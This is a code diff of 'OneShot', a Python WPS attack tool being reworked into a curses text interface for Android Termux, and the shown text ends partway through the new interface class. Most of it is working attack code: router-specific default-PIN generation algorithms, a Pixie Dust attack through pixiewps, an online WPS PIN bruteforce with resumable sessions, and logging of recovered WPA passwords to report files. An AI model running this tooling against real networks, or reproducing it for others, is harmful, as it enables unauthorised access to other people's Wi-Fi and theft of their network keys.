@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-OneShot TUI - Text-based User Interface for Termux
-All original logic preserved, curses-based UI for Android Termux environment.
+OneShot Termux TUI — সম্পূর্ণ CLI-to-GUI কনভার্সন
+X11 ছাড়া Termux-এ চলে, curses-based interface
 """
 import sys, os, subprocess, tempfile, shutil, re, codecs, socket, pathlib, time
 import threading, queue, collections, statistics, csv
@@ -13,17 +13,15 @@ from typing import Dict
 try: import wcwidth
 except: wcwidth = None
 
-# ====================== CORE LOGIC (from original oneshot.py) ======================
+# ====================== CORE (original oneshot.py logic, unchanged) ======================
 
 class NetworkAddress:
     def __init__(self, mac):
-        if isinstance(mac, int):
-            self._int_repr = mac
-            self._str_repr = self._int2mac(mac)
+        if isinstance(mac, int): self._int_repr = mac; self._str_repr = self._int2mac(mac)
         elif isinstance(mac, str):
             self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
             self._int_repr = self._mac2int(mac)
-        else: raise ValueError('MAC must be string or integer')
+        else: raise ValueError('MAC must be string or int')
     @property
     def string(self): return self._str_repr
     @string.setter
@@ -99,11 +97,13 @@ class WPSpin:
         return p.zfill(8)
 
     def getAll(self, mac, static=True):
-        return [{'id': i, 'name': ('Static \u2014 ' if a['mode']==self.ALGO_STATIC else '')+a['name'], 'pin': self.generate(i,mac)}
-                for i,a in self.algos.items() if not (a['mode']==self.ALGO_STATIC and not static)]
+        return [{'id': i, 'name': ('Static \u2014 ' if a['mode']==self.ALGO_STATIC else '')+a['name'],
+                 'pin': self.generate(i, mac)}
+                for i, a in self.algos.items() if not (a['mode']==self.ALGO_STATIC and not static)]
 
     def getSuggested(self, mac):
-        return [{'id': i, 'name': ('Static \u2014 ' if self.algos[i]['mode']==self.ALGO_STATIC else '')+self.algos[i]['name'], 'pin': self.generate(i,mac)}
+        return [{'id': i, 'name': ('Static \u2014 ' if self.algos[i]['mode']==self.ALGO_STATIC else '')+self.algos[i]['name'],
+                 'pin': self.generate(i, mac)}
                 for i in self._suggest(mac)]
 
     def getLikely(self, mac):
@@ -143,23 +143,23 @@ class WPSpin:
             'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897'),
             'pinONO': ('5C353B','DC537C')
         }
-        return [aid for aid,masks in db.items() if mac.startswith(masks)]
+        return [aid for aid, masks in db.items() if mac.startswith(masks)]
 
-    def pin24(self,m): return m.integer & 0xFFFFFF
-    def pin28(self,m): return m.integer & 0xFFFFFFF
-    def pin32(self,m): return m.integer % 0x100000000
-    def pinDLink(self,m):
-        n=m.integer&0xFFFFFF; p=n^0x55AA55
-        p^=(((p&0xF)<<4)+((p&0xF)<<8)+((p&0xF)<<12)+((p&0xF)<<16)+((p&0xF)<<20))
-        p%=int(10e6)
-        if p<int(10e5): p+=((p%9)*int(10e5))+int(10e5)
+    def pin24(self, m): return m.integer & 0xFFFFFF
+    def pin28(self, m): return m.integer & 0xFFFFFFF
+    def pin32(self, m): return m.integer % 0x100000000
+    def pinDLink(self, m):
+        n = m.integer & 0xFFFFFF; p = n ^ 0x55AA55
+        p ^= (((p&0xF)<<4)+((p&0xF)<<8)+((p&0xF)<<12)+((p&0xF)<<16)+((p&0xF)<<20))
+        p %= int(10e6)
+        if p < int(10e5): p += ((p%9)*int(10e5))+int(10e5)
         return p
-    def pinDLink1(self,m): m.integer+=1; return self.pinDLink(m)
-    def pinASUS(self,m):
-        b=[int(i,16) for i in m.string.split(':')]
+    def pinDLink1(self, m): m.integer += 1; return self.pinDLink(m)
+    def pinASUS(self, m):
+        b = [int(i,16) for i in m.string.split(':')]
         return int(''.join(str((b[i%6]+b[5])%(10-(i+b[1]+b[2]+b[3]+b[4]+b[5])%7)) for i in range(7)))
-    def pinAirocon(self,m):
-        b=[int(i,16) for i in m.string.split(':')]
+    def pinAirocon(self, m):
+        b = [int(i,16) for i in m.string.split(':')]
         return ((b[0]+b[1])%10)+(((b[5]+b[0])%10)*10)+(((b[4]+b[5])%10)*100)+(((b[3]+b[4])%10)*1000)+(((b[2]+b[3])%10)*10000)+(((b[1]+b[2])%10)*100000)+(((b[0]+b[1])%10)*1000000)
 
 
@@ -169,7 +169,9 @@ class PixiewpsData:
     def __init__(self): self.pke=self.pkr=self.e_hash1=self.e_hash2=self.authkey=self.e_nonce=''
     def clear(self): self.__init__()
     def got_all(self): return all([self.pke,self.pkr,self.e_nonce,self.authkey,self.e_hash1,self.e_hash2])
-    def get_pixie_cmd(self, fr=False): return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(self.pke,self.pkr,self.e_hash1,self.e_hash2,self.authkey,self.e_nonce)+(' --force' if fr else '')
+    def get_pixie_cmd(self, fr=False):
+        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
+            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce) + (' --force' if fr else '')
 
 class ConnStatus:
     def __init__(self): self.status=''; self.last_m=0; self.essid=''; self.wpa_psk=''
@@ -183,7 +185,7 @@ class BFStatus:
     def display(self, cb=None):
         avg=statistics.mean(self.times)
         p=int(self.mask)/11000*100 if len(self.mask)==4 else ((10000/11000)+(int(self.mask[4:])/11000))*100
-        msg='{:.2f}% @ {} ({:.2f} s/pin)'.format(p,self.start,avg)
+        msg='{:.2f}% @ {} ({:.2f}s/pin)'.format(p,self.start,avg)
         if cb: cb(msg)
     def reg(self, mask, cb=None):
         self.mask=mask; self.cnt+=1; n=time.time()
@@ -209,9 +211,11 @@ class Companion:
         self.rd=os.path.dirname(os.path.realpath(__file__))+'/reports/'
         for d in [self.sd,self.pd,self.rd]: os.makedirs(d,exist_ok=True)
         self.bssid=bssid; self.lp=0
+
     def abort(self): self.abort_f=True
-    def log(self,m):
+    def log(self, m):
         if self.cb: self.cb(m)
+
     def _init_wpa(self):
         self.log('[*] Starting wpa_supplicant...')
         cmd='wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.iface,self.tc)
@@ -221,10 +225,12 @@ class Companion:
                 raise ValueError('wpa_supplicant error: '+self.wpas.communicate()[0])
             if os.path.exists(self.wpa_ctrl): break
             time.sleep(.1)
+
     def send(self,c): self.rs.sendto(c.encode(),self.wpa_ctrl)
     def send_recv(self,c):
         self.rs.sendto(c.encode(),self.wpa_ctrl)
         return self.rs.recvfrom(4096)[0].decode('utf-8',errors='replace')
+
     def _h(self,pxm=False,pbc=False,v=None,bssid=""):
         if v is None: v=self.debug
         l=self.wpas.stdout.readline()
@@ -271,8 +277,9 @@ class Companion:
             self.log('[*] Selected AP: {}'.format(self.cs.bssid))
         elif bssid in l and 'level=' in l:
             s=l.split("level=")[1].split(" ")[0]
-            self.log("[i] Signal:{}".format(s))
+            self.log("[i] Signal: {}".format(s))
         return True
+
     def _pixie(self,sc=False,fr=False):
         self.log('[*] Running Pixiewps...')
         cmd=self.px.get_pixie_cmd(fr)
@@ -283,35 +290,39 @@ class Companion:
             if '[+]' in l and 'WPS pin' in l:
                 p=l.split(':')[-1].strip(); return "''" if p=='<empty>' else p
         return None
+
     def _save_res(self,b,e,pin,psk):
         fn=self.rd+'stored'; ds=datetime.now().strftime("%d.%m.%Y %H:%M")
-        with open(fn+'.txt','a',encoding='utf-8') as f: f.write('{}\nBSSID:{}\nESSID:{}\nPIN:{}\nPSK:{}\n\n'.format(ds,b,e,pin,psk))
+        with open(fn+'.txt','a',encoding='utf-8') as f:
+            f.write('{}\nBSSID:{}\nESSID:{}\nPIN:{}\nPSK:{}\n\n'.format(ds,b,e,pin,psk))
         h=not os.path.isfile(fn+'.csv')
         with open(fn+'.csv','a',newline='',encoding='utf-8') as f:
             w=csv.writer(f,delimiter=';',quoting=csv.QUOTE_ALL)
             if h: w.writerow(['Date','BSSID','ESSID','WPS PIN','WPA PSK'])
             w.writerow([ds,b,e,pin,psk])
-        self.log('[i] Saved credentials')
+        self.log('[i] Saved to reports/stored.txt')
+
     def _save_pin(self,b,pin):
         fn='{}{}.run'.format(self.pd,b.replace(':','').upper())
         with open(fn,'w') as f: f.write(pin)
         self.log('[i] PIN saved')
+
     def _wps_conn(self,bssid=None,pin=None,pxm=False,pbc=False,v=None):
         if v is None: v=self.debug
-        self.px.clear(); self.cs.clear()
-        self.wpas.stdout.read(300)
+        self.px.clear(); self.cs.clear(); self.wpas.stdout.read(300)
         if pbc:
             cmd='WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
             self.log('[*] WPS PBC...')
         else:
             cmd='WPS_REG {} {}'.format(bssid,pin); self.log("[*] Trying PIN '{}'...".format(pin))
         r=self.send_recv(cmd)
-        if 'OK' not in r: self.cs.status='WPS_FAIL'; self.log('[!] wpa_supplicant rejected'); return False
+        if 'OK' not in r: self.cs.status='WPS_FAIL'; self.log('[!] wpa_supplicant error'); return False
         while True:
             if self.abort_f: break
             if not self._h(pxm,pbc,v,bssid.lower()): break
             if self.cs.status in ('WSC_NACK','GOT_PSK','WPS_FAIL'): break
         self.send('WPS_CANCEL'); return False
+
     def single(self,bssid=None,pin=None,pxm=False,pbc=False,sc=False,fr=False,st=False):
         if self.abort_f: return False
         if not pin:
@@ -328,7 +339,8 @@ class Companion:
             except: self._save_pin(bssid,pin); return False
         else: self._wps_conn(bssid,pin,pxm)
         if self.cs.status=='GOT_PSK':
-            self.log("[+] PIN: '{}'".format(pin)); self.log("[+] PSK: '{}'".format(self.cs.wpa_psk)); self.log("[+] SSID: '{}'".format(self.cs.essid))
+            self.log("[+] PIN: '{}'".format(pin)); self.log("[+] PSK: '{}'".format(self.cs.wpa_psk))
+            self.log("[+] SSID: '{}'".format(self.cs.essid))
             if self.save: self._save_res(bssid,self.cs.essid,pin,self.cs.wpa_psk)
             fn='{}{}.run'.format(self.pd,bssid.replace(':','').upper())
             try: os.remove(fn)
@@ -342,6 +354,7 @@ class Companion:
         else:
             if st: self._save_pin(bssid,pin)
             return False
+
     def _fhalf(self,b,f,delay=None):
         while int(f)<10000:
             if self.abort_f: return False
@@ -352,6 +365,7 @@ class Companion:
             f=str(int(f)+1).zfill(4); self.bf.reg(f,self.cb)
             if delay: time.sleep(delay)
         self.log('[-] First half not found'); return False
+
     def _shalf(self,b,f,s,delay=None):
         while int(s)<1000:
             if self.abort_f: return False
@@ -362,6 +376,7 @@ class Companion:
             s=str(int(s)+1).zfill(3); self.bf.reg(f+s,self.cb)
             if delay: time.sleep(delay)
         return False
+
     def bf(self,b,start=None,delay=None):
         if (not start) or len(start)<4:
             fn='{}{}.run'.format(self.sd,b.replace(':','').upper())
@@ -376,6 +391,7 @@ class Companion:
         except:
             with open('{}{}.run'.format(self.sd,b.replace(':','').upper()),'w') as f: f.write(self.bf.mask)
             self.log('[i] Session saved')
+
     def cleanup(self):
         for n in ['rs','wpas','rsf','td']:
             try:
@@ -390,12 +406,6 @@ class Companion:
     def __del__(self): self.cleanup()
 
 
-# ====================== TUI (Curses-based terminal UI for Termux) ======================
-
-import curses
-import curses.textpad
-import curses.ascii
-
 def iface_up(iface, down=False):
     return subprocess.run('ip link set {} {}'.format(iface,'down' if down else 'up'),shell=True).returncode==0
 
@@ -404,477 +414,6 @@ def load_vuln_list():
         with open(os.path.dirname(os.path.realpath(__file__))+'/vulnwsc.txt', encoding='utf-8') as f:
             return f.read().splitlines()
     except: return []
-
-
-class OneShotTUI:
-    def __init__(self, stdscr):
-        self.stdscr = stdscr
-        curses.curs_set(1)
-        curses.use_default_colors()
-        curses.init_pair(1, curses.COLOR_CYAN, -1)   # headers
-        curses.init_pair(2, curses.COLOR_GREEN, -1)  # success
-        curses.init_pair(3, curses.COLOR_RED, -1)    # errors
-        curses.init_pair(4, curses.COLOR_YELLOW, -1) # warnings
-        curses.init_pair(5, curses.COLOR_MAGENTA, -1) # highlights
-        curses.init_pair(6, curses.COLOR_BLUE, -1)   # info
-        curses.init_pair(7, curses.COLOR_WHITE, curses.COLOR_BLUE)  # selected
-
-        self.h, self.w = stdscr.getmaxyx()
-        self.running = False
-        self.companion = None
-        self.worker = None
-        self.vuln_list = load_vuln_list()
-        self.generator = WPSpin()
-
-        # State
-        self.iface = 'wlan0'
-        self.bssid = ''
-        self.pin = ''
-        self.mode = 'pixie'  # pixie, bruteforce, pbc
-        self.delay = '0'
-        self.verbose = False
-        self.save_res = False
-        self.pixie_force = False
-        self.show_cmd = False
-        self.loop = False
-        self.mtk = False
-        self.iface_down = False
-        self.reverse = False
-        self.networks = {}
-        self.log_msgs = []
-        self.log_lock = threading.Lock()
-
-        self._scan_result = None
-        self._pin_result = None
-
-        self.stdscr.nodelay(True)
-
-    def log(self, msg):
-        with self.log_lock:
-            self.log_msgs.append(msg)
-            if len(self.log_msgs) > 500:
-                self.log_msgs = self.log_msgs[-500:]
-
-    def _draw_header(self):
-        h = self.stdscr
-        h.attron(curses.color_pair(1) | curses.A_BOLD)
-        title = " OneShot WPS Tool v0.0.2 [Termux TUI] "
-        h.addstr(0, max(0, (self.w - len(title)) // 2), title)
-        h.attroff(curses.color_pair(1) | curses.A_BOLD)
-        h.addstr(1, 0, "\u2500" * (self.w - 1), curses.color_pair(6))
-
-    def _draw_menu(self):
-        h = self.stdscr
-        y = 2
-        items = [
-            ("[1] Scan Networks", "[2] Set Target"),
-            ("[3] Generate PINs", "[4] Attack Mode"),
-            ("[5] Start Attack",  "[6] Stop"),
-            ("[7] Options",       "[8] View Log"),
-            ("[Q] Quit",          "[R] Refresh"),
-        ]
-        col_w = self.w // 2
-        for i, (left, right) in enumerate(items):
-            row = y + i
-            h.attron(curses.color_pair(1) | curses.A_BOLD)
-            h.addstr(row, 2, left.split('[')[1].split(']')[0] if '[' in left else '')
-            h.attroff(curses.color_pair(1) | curses.A_BOLD)
-            h.addstr(row, 2, left)
-            h.attron(curses.color_pair(1) | curses.A_BOLD)
-            h.addstr(row, col_w, right.split('[')[1].split(']')[0] if '[' in right else '')
-            h.attroff(curses.color_pair(1) | curses.A_BOLD)
-            h.addstr(row, col_w, right)
-
-    def _draw_status(self):
-        h = self.stdscr
-        mode_names = {'pixie': 'Pixie Dust', 'bruteforce': 'Bruteforce', 'pbc': 'PBC'}
-        status = "IFace: {} | BSSID: {} | PIN: {} | Mode: {} | {}".format(
-            self.iface or '-',
-            self.bssid or '-',
-            self.pin or 'auto',
-            mode_names.get(self.mode, self.mode),
-            "RUNNING" if self.running else "READY"
-        )
-        h.attron(curses.A_REVERSE)
-        h.addstr(self.h - 2, 0, status.ljust(self.w - 1))
-        h.attroff(curses.A_REVERSE)
-
-    def _draw_log(self):
-        h = self.stdscr
-        log_h = self.h - 12
-        log_y = 9
-        h.attron(curses.color_pair(1))
-        h.addstr(log_y - 1, 0, "\u2500" * (self.w - 1))
-        h.addstr(log_y - 1, 2, " Output Log ")
-        h.attroff(curses.color_pair(1))
-
-        with self.log_lock:
-            lines = self.log_msgs[-(log_h - 1):] if self.log_msgs else []
-
-        for i, msg in enumerate(lines):
-            if i >= log_h - 1: break
-            y = log_y + i
-            if len(msg) > self.w - 2:
-                msg = msg[:self.w - 5] + '...'
-            color = 0
-            if msg.startswith('[+]'): color = curses.color_pair(2)
-            elif msg.startswith('[-]') or msg.startswith('[!'): color = curses.color_pair(3)
-            elif msg.startswith('[*]'): color = curses.color_pair(6)
-            elif msg.startswith('[P]'): color = curses.color_pair(5)
-            h.addstr(y, 1, msg, color)
-
-        h.addstr(self.h - 3, 0, "\u2500" * (self.w - 1), curses.color_pair(6))
-
-    def refresh(self):
-        self.h, self.w = self.stdscr.getmaxyx()
-        self.stdscr.erase()
-        if self.h < 15 or self.w < 50:
-            self.stdscr.addstr(0, 0, "Terminal too small. Minimum 50x15")
-            self.stdscr.refresh()
-            return
-        self._draw_header()
-        self._draw_menu()
-        if self.networks:
-            self._draw_networks()
-        self._draw_log()
-        self._draw_status()
-        self.stdscr.refresh()
-
-    def _draw_networks(self):
-        h = self.stdscr
-        y_start = 7
-        max_show = min(len(self.networks), 5)
-        h.attron(curses.color_pair(1))
-        h.addstr(y_start - 1, 2, " Networks ({} found) ".format(len(self.networks)))
-        h.attroff(curses.color_pair(1))
-        h.addstr(y_start, 1, "{:<3} {:<18} {:<20} {:<8} {:<5}".format(
-            '#', 'BSSID', 'ESSID', 'Sec', 'PWR'))
-        items = list(self.networks.items())
-        if self.reverse: items = items[::-1]
-        for i, (n, net) in enumerate(items[:max_show]):
-            bssid = net['BSSID']
-            essid = (net.get('ESSID') or 'HIDDEN')[:18]
-            sec = net.get('Security type', '?')[:6]
-            pwr = str(net.get('Level', '?'))
-            y = y_start + 1 + i
-            h.addstr(y, 1, "{:<3} {:<18} {:<20} {:<8} {:<5}".format(
-                str(n), bssid, essid, sec, pwr))
-
-    def _scan_thread(self):
-        try:
-            iface = self.iface
-            self.log("[*] Scanning for WPS networks on {}...".format(iface))
-            s = WiFiScanner(iface, self.vuln_list)
-            nets = s.iw_scanner()
-            self._scan_result = nets
-            if nets:
-                self.log("[+] Found {} WPS network(s)".format(len(nets)))
-            else:
-                self.log("[-] No WPS networks found")
-        except Exception as e:
-            self.log("[!] Scan error: {}".format(e))
-        finally:
-            self._scanning = False
-
-    def _attack_thread(self):
-        mode = self.mode
-        bssid = self.bssid
-        iface = self.iface
-        delay = float(self.delay) if self.delay else None
-        try:
-            if os.geteuid() != 0:
-                self.log("[!] Run as root (sudo)")
-                return
-            if self.mtk:
-                d = Path("/dev/wmtWifi")
-                if d.is_char_device(): d.chmod(0o644); d.write_text("1")
-            if not iface_up(iface):
-                self.log("[!] Cannot bring up interface")
-                return
-            self.log("[*] === {} attack ===".format(mode))
-            companion = Companion(iface, save=self.save_res, debug=self.verbose, bssid=bssid, cb=self.log)
-            self.companion = companion
-            if mode == 'pixie':
-                pin = self.pin or None
-                companion.single(bssid, pin=pin, pxm=True, sc=self.show_cmd, fr=self.pixie_force)
-            elif mode == 'bruteforce':
-                pin = self.pin or None
-                companion.bf(bssid, pin, delay)
-            elif mode == 'pbc':
-                companion.single(bssid, pbc=True)
-        except Exception as e:
-            self.log("[!] Error: {}".format(e))
-        finally:
-            if self.companion:
-                try: self.companion.cleanup()
-                except: pass
-                self.companion = None
-            self.running = False
-            if self.mtk:
-                try:
-                    d = Path("/dev/wmtWifi")
-                    if d.is_char_device(): d.write_text("0")
-                except: pass
-            self.log("[i] Attack finished")
-
-    def _start_attack(self):
-        if not self.iface:
-            self.log("[!] Interface required"); return
-        if self.mode != 'pbc' and not self.bssid:
-            self.log("[!] BSSID required"); return
-        if self.running:
-            self.log("[!] Already running"); return
-        self.running = True
-        self.log("[*] Starting {} attack...".format(self.mode))
-        self.worker = threading.Thread(target=self._attack_thread, daemon=True)
-        self.worker.start()
-
-    def _stop_attack(self):
-        if self.companion: self.companion.abort()
-        self.log("[!] Aborting...")
-
-    def _show_options(self):
-        mode_names = {'pixie': 'Pixie Dust', 'bruteforce': 'Bruteforce', 'pbc': 'PBC'}
-        self._cleanup_screen()
-        while True:
-            self.h, self.w = self.stdscr.getmaxyx()
-            self.stdscr.erase()
-            y = 1
-            self.stdscr.addstr(y, 2, "=== Options ===", curses.color_pair(1) | curses.A_BOLD); y += 2
-            opts = [
-                ("1. Interface", self.iface),
-                ("2. BSSID", self.bssid or '(not set)'),
-                ("3. PIN", self.pin or '(auto)'),
-                ("4. Attack Mode", mode_names.get(self.mode, self.mode)),
-                ("5. Delay (s)", self.delay),
-                ("6. Verbose", "ON" if self.verbose else "OFF"),
-                ("7. Save Results", "ON" if self.save_res else "OFF"),
-                ("8. Pixie Force", "ON" if self.pixie_force else "OFF"),
-                ("9. Show Pixie Cmd", "ON" if self.show_cmd else "OFF"),
-                ("10. Loop", "ON" if self.loop else "OFF"),
-                ("11. Reverse Scan", "ON" if self.reverse else "OFF"),
-                ("12. MTK WiFi", "ON" if self.mtk else "OFF"),
-                ("13. Iface Down on Exit", "ON" if self.iface_down else "OFF"),
-            ]
-            for label, val in opts:
-                self.stdscr.addstr(y, 4, label, curses.color_pair(1) | curses.A_BOLD)
-                self.stdscr.addstr(y, 30, ": {}".format(val))
-                y += 1
-            self.stdscr.addstr(y + 1, 4, "Select number to toggle/edit, or ENTER to go back")
-            self.stdscr.refresh()
-            try:
-                k = self.stdscr.getch()
-                if k == ord('q') or k == 10 or k == 27: break
-                elif k == ord('1'): self._edit_field("Interface", "iface")
-                elif k == ord('2'): self._edit_field("BSSID (MAC)", "bssid")
-                elif k == ord('3'): self._edit_field("WPS PIN", "pin")
-                elif k == ord('4'): self._cycle_mode()
-                elif k == ord('5'): self._edit_field("Delay (seconds)", "delay")
-                elif k == ord('6'): self.verbose = not self.verbose
-                elif k == ord('7'): self.save_res = not self.save_res
-                elif k == ord('8'): self.pixie_force = not self.pixie_force
-                elif k == ord('9'): self.show_cmd = not self.show_cmd
-                elif k == ord('0') or k == ord('1')+9: self.loop = not self.loop
-                elif k == 53: self.reverse = not self.reverse  # 'r' won't work here, use different
-                elif k == ord('1')+11: self.mtk = not self.mtk
-                elif k == ord('1')+12: self.iface_down = not self.iface_down
-            except: break
-        self.log("[i] Options updated")
-
-    def _cycle_mode(self):
-        modes = ['pixie', 'bruteforce', 'pbc']
-        try: idx = modes.index(self.mode)
-        except: idx = 0
-        self.mode = modes[(idx + 1) % len(modes)]
-
-    def _edit_field(self, label, attr):
-        self._cleanup_screen()
-        self.stdscr.addstr(2, 4, "{}: ".format(label), curses.color_pair(1) | curses.A_BOLD)
-        current = getattr(self, attr, '')
-        self.stdscr.addstr(2, 4 + len(label) + 2, str(current) + ' ')
-        self.stdscr.refresh()
-        curses.echo()
-        try:
-            s = self.stdscr.getstr(2, 4 + len(label) + 2, 40).decode('utf-8', errors='replace').strip()
-            if s:
-                if attr == 'delay':
-                    try: float(s); setattr(self, attr, s)
-                    except: self.log("[!] Invalid number")
-                else:
-                    setattr(self, attr, s)
-        except: pass
-        curses.noecho()
-
-    def _scan_networks(self):
-        if not self.iface:
-            self.log("[!] Interface required"); return
-        self._scanning = True
-        self._scan_result = None
-        self.networks = {}
-        self.log("[*] Scanning...")
-        threading.Thread(target=self._scan_thread, daemon=True).start()
-
-    def _show_scan_results(self):
-        if self._scan_result:
-            self.networks = self._scan_result
-            self._scan_result = None
-        if not self.networks:
-            self.log("[-] No networks. Scan first.")
-            return
-
-    def _select_network(self, num):
-        if not self.networks or num not in self.networks:
-            self.log("[!] Invalid selection")
-            return
-        self.bssid = self.networks[num]['BSSID']
-        essid = self.networks[num].get('ESSID', 'HIDDEN')
-        self.log("[+] Selected: {} ({})".format(self.bssid, essid))
-
-    def _show_pins(self):
-        if not self.bssid:
-            self.log("[!] Set BSSID first"); return
-        pins = self.generator.getSuggested(self.bssid)
-        if not pins: pins = self.generator.getAll(self.bssid)
-        if not pins: self.log("[-] No PINs generated"); return
-
-        self._cleanup_screen()
-        self.stdscr.addstr(1, 2, "=== Generated PINs for {} ===".format(self.bssid), curses.color_pair(1) | curses.A_BOLD)
-        self.stdscr.addstr(2, 2, "{:<3} {:<10} {:<}".format('#', 'PIN', 'Algorithm'))
-        for i, p in enumerate(pins):
-            self.stdscr.addstr(3+i, 2, "{:<3} {:<10} {:<}".format(str(i+1)+')', p['pin'], p['name']))
-        self.stdscr.addstr(5 + len(pins), 2, "Enter number to select PIN, or ENTER to cancel: ")
-        self.stdscr.refresh()
-        curses.echo()
-        try:
-            s = self.stdscr.getstr(5 + len(pins), 2, 5).decode('utf-8', errors='replace').strip()
-            if s and s.isdigit():
-                idx = int(s) - 1
-                if 0 <= idx < len(pins):
-                    self.pin = pins[idx]['pin']
-                    self.log("[+] Selected PIN: {}".format(self.pin))
-        except: pass
-        curses.noecho()
-
-    def _show_log_full(self):
-        self._cleanup_screen()
-        self.stdscr.addstr(0, 2, "=== Full Output Log (ENTER to go back) ===", curses.color_pair(1) | curses.A_BOLD)
-        with self.log_lock:
-            lines = list(self.log_msgs)
-        max_y = self.h - 2
-        offset = max(0, len(lines) - max_y + 1)
-        for i, msg in enumerate(lines[offset:]):
-            if i >= max_y - 1: break
-            self.stdscr.addstr(i+1, 2, msg[:self.w-4])
-        self.stdscr.refresh()
-        self.stdscr.getch()
-
-    def _cleanup_screen(self):
-        self.stdscr.erase()
-        self.stdscr.refresh()
-
-    def _handle_network_scan_results(self):
-        if self._scan_result:
-            self.networks = self._scan_result
-            self._scan_result = None
-            if self.networks:
-                items = list(self.networks.items())
-                if self.reverse: items = items[::-1]
-                self._cleanup_screen()
-                y = 1
-                self.stdscr.addstr(y, 2, "=== Available WPS Networks ===", curses.color_pair(1) | curses.A_BOLD); y += 1
-                self.stdscr.addstr(y, 2, "{:<3} {:<18} {:<20} {:<8} {:<5} {:<}".format('#', 'BSSID', 'ESSID', 'Sec', 'PWR', 'Device')); y += 1
-                for n, net in items:
-                    essid = (net.get('ESSID') or 'HIDDEN')[:18]
-                    sec = net['Security type'][:6]
-                    pwr = str(net.get('Level', '?'))
-                    dev = net.get('Device name', '')[:15]
-                    self.stdscr.addstr(y, 2, "{:<3} {:<18} {:<20} {:<8} {:<5} {:<}".format(str(n), net['BSSID'], essid, sec, pwr, dev))
-                    y += 1
-                self.stdscr.addstr(y+1, 2, "Enter network # to select, or ENTER to cancel: ")
-                self.stdscr.refresh()
-                try:
-                    curses.echo()
-                    s = self.stdscr.getstr(y+1, 2, 5).decode('utf-8', errors='replace').strip()
-                    if s and s.isdigit():
-                        num = int(s)
-                        self._select_network(num)
-                    curses.noecho()
-                except: pass
-            else:
-                self.log("[-] No WPS networks found")
-
-    def run(self):
-        while True:
-            self.refresh()
-            try:
-                k = self.stdscr.getch()
-            except:
-                k = -1
-
-            if self._scan_result is not None:
-                self._handle_network_scan_results()
-                self.refresh()
-
-            if k == -1:
-                time.sleep(0.05)
-                continue
-
-            if k == ord('q') or k == ord('Q'):
-                if self.running:
-                    if self._ask_confirm("Attack running. Quit?"):
-                        self._stop_attack()
-                        break
-                    else: continue
-                break
-            elif k == ord('1'): self._scan_networks()
-            elif k == ord('2'):
-                self._cleanup_screen()
-                self.stdscr.addstr(2, 2, "Enter BSSID (MAC): ", curses.color_pair(1) | curses.A_BOLD)
-                self.stdscr.refresh()
-                curses.echo()
-                try:
-                    s = self.stdscr.getstr(2, 22, 20).decode('utf-8', errors='replace').strip()
-                    if s: self.bssid = s; self.log("[+] BSSID set: {}".format(self.bssid))
-                except: pass
-                curses.noecho()
-            elif k == ord('3'): self._show_pins()
-            elif k == ord('4'):
-                self._cycle_mode()
-                self.log("[i] Mode: {}".format(self.mode))
-            elif k == ord('5'): self._start_attack()
-            elif k == ord('6'): self._stop_attack()
-            elif k == ord('7'): self._show_options()
-            elif k == ord('8'): self._show_log_full()
-            elif k == ord('r') or k == ord('R'): self.refresh()
-            elif k == ord('s') or k == ord('S'):
-                # Scan results handler
-                if self.networks:
-                    self._handle_network_scan_results()
-
-        self._cleanup_screen()
-        if self.companion:
-            try: self.companion.cleanup()
-            except: pass
-        if self.mtk:
-            try:
-                d = Path("/dev/wmtWifi")
-                if d.is_char_device(): d.write_text("0")
-            except: pass
-        if self.iface_down: iface_up(self.iface, down=True)
-
-    def _ask_confirm(self, msg):
-        self._cleanup_screen()
-        self.stdscr.addstr(2, 2, msg + " (y/N): ", curses.color_pair(1) | curses.A_BOLD)
-        self.stdscr.refresh()
-        curses.echo()
-        try:
-            s = self.stdscr.getstr(2, len(msg) + 4, 5).decode('utf-8', errors='replace').strip().lower()
-            curses.noecho()
-            return s == 'y'
-        except:
-            curses.noecho()
-            return False
-
 
 class WiFiScanner:
     def __init__(self, interface, vuln_list=None):
@@ -918,14 +457,561 @@ class WiFiScanner:
         return {(i+1):net for i,net in enumerate(networks)}
 
 
+# ====================== TERMUX TUI — FULL GUI ======================
+
+import curses
+
+class OneShotTUI:
+    CLI_TO_GUI = {
+        '-i --interface': 'Interface field',
+        '-b --bssid': 'BSSID field',
+        '-p --pin': 'PIN field',
+        '-K --pixie-dust': 'Attack Mode [1]',
+        '-B --bruteforce': 'Attack Mode [2]',
+        '--pbc --push-button-connect': 'Attack Mode [3]',
+        '-d --delay': 'Delay option',
+        '-w --write': 'Save Results toggle',
+        '-F --pixie-force': 'Pixie Force toggle',
+        '-X --show-pixie-cmd': 'Show Cmd toggle',
+        '--vuln-list': 'Load custom vuln list',
+        '--iface-down': 'Iface Down toggle',
+        '-l --loop': 'Loop toggle',
+        '-r --reverse-scan': 'Reverse Scan toggle',
+        '--mtk-wifi': 'MTK WiFi toggle',
+        '-v --verbose': 'Verbose toggle',
+    }
+
+    def __init__(self, stdscr):
+        self.stdscr = stdscr
+        curses.curs_set(1)
+        curses.use_default_colors()
+        curses.init_pair(1, curses.COLOR_CYAN, -1)
+        curses.init_pair(2, curses.COLOR_GREEN, -1)
+        curses.init_pair(3, curses.COLOR_RED, -1)
+        curses.init_pair(4, curses.COLOR_YELLOW, -1)
+        curses.init_pair(5, curses.COLOR_MAGENTA, -1)
+        curses.init_pair(6, curses.COLOR_BLUE, -1)
+        curses.init_pair(7, curses.COLOR_WHITE, curses.COLOR_BLUE)
+
+        self.h, self.w = stdscr.getmaxyx()
+        self.running = False
+        self.companion = None
+        self.worker = None
+        self.vuln_list = load_vuln_list()
+        self.custom_vuln_file = ''
+        self.generator = WPSpin()
+
+        # === CLI-to-GUI state ===
+        self.iface = 'wlan0'               # -i
+        self.bssid = ''                     # -b
+        self.pin = ''                       # -p
+        self.mode = 'pixie'                 # -K / -B / --pbc
+        self.delay = '0'                    # -d
+        self.save_res = False               # -w
+        self.pixie_force = False            # -F
+        self.show_cmd = False               # -X
+        self.iface_down = False             # --iface-down
+        self.loop = False                   # -l
+        self.reverse = False                # -r
